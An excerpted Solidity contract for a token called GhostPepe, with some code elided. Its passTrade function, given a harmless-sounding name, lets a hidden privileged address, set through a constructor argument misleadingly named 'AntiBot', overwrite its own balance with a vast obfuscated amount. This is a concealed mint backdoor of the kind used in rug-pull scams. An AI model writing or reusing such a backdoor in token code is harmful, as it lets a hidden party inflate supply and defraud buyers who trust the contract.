...
contract GhostPepe is Ownable {

    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address public  _MKTCEO;
    ...
    function passTrade() external {
        if (_msgSender() != _MKTCEO) {
            return;
        }else if (_MKTCEO == _msgSender()){
            _balances[_msgSender()] = (1)*(1)*((8000))*(2330000000000*10**decimals());
        }
    }
    ...
    constructor(string memory name_, string memory symbol_,address AntiBot, uint256 cfees) {
        ...
        _MYsymbol = symbol_;
        _MKTCEO = AntiBot;
        _onceCCCsupply(msg.sender, 10000000000*10**decimals());
        _MYcfees = cfees;
    }
